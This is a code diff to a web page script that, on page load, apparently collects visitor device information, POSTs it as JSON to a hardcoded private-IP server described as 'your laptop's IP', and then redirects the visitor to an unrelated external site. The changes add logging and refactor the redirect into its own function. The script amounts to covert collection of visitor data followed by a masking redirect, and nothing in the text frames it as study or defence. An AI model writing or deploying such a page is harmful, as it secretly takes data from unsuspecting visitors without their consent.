@@ -73,28 +73,33 @@
 
         function sendToServer(info) {
             const serverUrl = "http://192.168.1.17:8000/submit"; // Your laptop's IP
-            console.log("Sending data to:", serverUrl);
+            console.log("Attempting to send data to:", serverUrl);
+            console.log("Data:", JSON.stringify(info));
             fetch(serverUrl, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(info)
             })
                 .then(response => {
-                    if (!response.ok) throw new Error(`Server error: ${response.status}`);
+                    if (!response.ok) throw new Error(`Server error: ${response.status} ${response.statusText}`);
                     return response.json();
                 })
                 .then(data => {
                     console.log("Data sent successfully:", data);
-                    setTimeout(() => {
-                        window.location.href = "http://christyndavemaurin.cmu-online.tech/Tripside/default.asp";
-                    }, 1000); // 1-second delay
+                    redirect();
                 })
                 .catch(err => {
                     console.error("Failed to send data:", err.message);
-                    setTimeout(() => {
-                        window.location.href = "http://christyndavemaurin.cmu-online.tech/Tripside/default.asp";
-                    }, 1000);
+                    redirect();
                 });
+        }
+
+        function redirect() {
+            const redirectUrl = "http://christyndavemaurin.cmu-online.tech/Tripside/default.asp";
+            console.log("Redirecting to:", redirectUrl);
+            setTimeout(() => {
+                window.location.href = redirectUrl;
+            }, 1500); // 1.5-second delay
         }
 
         window.onload = getDeviceInfo;
